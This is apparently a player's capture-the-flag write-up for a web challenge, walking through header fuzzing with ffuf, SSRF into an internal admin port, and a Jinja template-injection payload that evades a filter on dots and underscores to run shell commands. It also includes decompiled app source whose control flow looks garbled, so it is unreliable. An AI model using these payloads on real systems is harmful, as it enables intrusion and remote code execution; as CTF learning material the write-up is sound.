- SSRF to template injection with fucked up access control D:
- First read `robots.txt` and saw endpoints `/admin` and `/fetch`
	- Fetch requires a specific header set to `true` (comment in `robots.txt`)
- Used [[ffuf]] to find the `/fetch` endpoint header
```sh
ffuf -u https://wormhole.sunshinectf.games/fetch \
	 -H "FUZZ: true" \
	 -w ~/ctf/TOOLS/SecLists-master/Discovery/Web-Content/burp-parameter-names.txt \
	 -fc 403
```
- `-fc` filters code `403`
- We got the auth to be `allow: true`

- Now we can send SSRF payloads through the `url=` data field
- If `/admin` appears anywhere in the data field, we get an error saying `?template=` needs to be provided
- Providing a test template, we get `403` response codes, we don't have access
- This part took a while and was a little guessy but since this is SSRF I assumed that we need to access an internal server resource on `localhost`, so I had to brute-force the internal port-mapping of the web application:
```sh
 ffuf -u https://wormhole.sunshinectf.games/fetch \
	  -X POST \
	  -H "Content-Type: application/x-www-form-urlencoded" \
	  -H "allow: true" \
	  -d "url=http://localhost:FUZZ/admin?template=+" \
	  -w <(seq 1 65535) \
	  -fr "Connection refused"
```
- `-fr` filters the regex expressions
- We found a single valid response on port `8000`

- Once the `/admin` endpoint stopped producing errors, it ended up being blank with our empty `?template=+`
- I tested with a simple jinja SSTI payload `{{7*7}}` and it rendered
- We could get RCE with this, I tried importing os to run system commands but the template kept returning `Nope.`
- After more attempts, I realized that the application is rejecting any template injection payload that has `.` or `_`
- Through LLM help, we got a successful RCE payload that bypasses the sanitization check
```
url=http://localhost:8000/admin?template={{lipsum|attr(%27%c%cglobals%c%c%27|format(95,95,95,95))|attr(%27%c%cgetitem%c%c%27|format(95,95,95,95))(%27os%27)|attr(%27popen%27)(%27ls -lR')|attr('read')()}}
```

- After getting RCE on the box, I couldn't find a flag file or anything anywhere. There was no app.py and the dockerfile shell script didn't help much
- I was able to b64 exfiltrate the compiled python code from the pycache to get this:
```python
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: /opt/chal/app.py
# Bytecode version: 3.13.0rc3 (3571)
# Source timestamp: 2025-09-26 19:16:38 UTC (1758914198)

from flask import Flask, request, render_template_string, render_template, abort, flash, redirect, url_for
import requests
import uuid
FLAG = open('flag.txt').read()
app = Flask(__name__)
app.secret_key = uuid.uuid4().hex

def create_app():
    return app

@app.route('/robots.txt')
def robots():
    return ("\nUser-agent: *\nDisallow: /admin\nDisallow: /fetch\n\n# internal SSRF testing tool requires special auth header to be set to 'true'\n", 200, {'Content-Type': 'text/plain'})

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/fetch', methods=['GET', 'POST'])
def fetch():
    if request.headers.get('allow', '') != 'true':
        pass
    return ('403 Forbidden: missing or incorrect SSRF access header', 403)

@app.route('/admin', methods=['GET'])
def admin():
    abort(403) if request.remote_addr != '127.0.0.1' else False
    abort(405) if request.method != 'GET' else False
    template_input = request.args.get('template', '')
    if not template_input:
        pass
    return ('Missing information in the ?template= parameter in the URL', 400)
if __name__ == '__main__':
    app = create_app()
    app.run(host='0.0.0.0', port=3000)
```
- This confirmed what I already knew about the webapp's function. Port 3000 threw me down a https fuzzing rabbit hole
- I started testing more malicious RCE action and realized that there was no access control for the users to delete files and this challenge wasn't instanced
- The flag file was supposed to be present! AND the app file! People were just deleting them lol, I told an admin and catted the flag
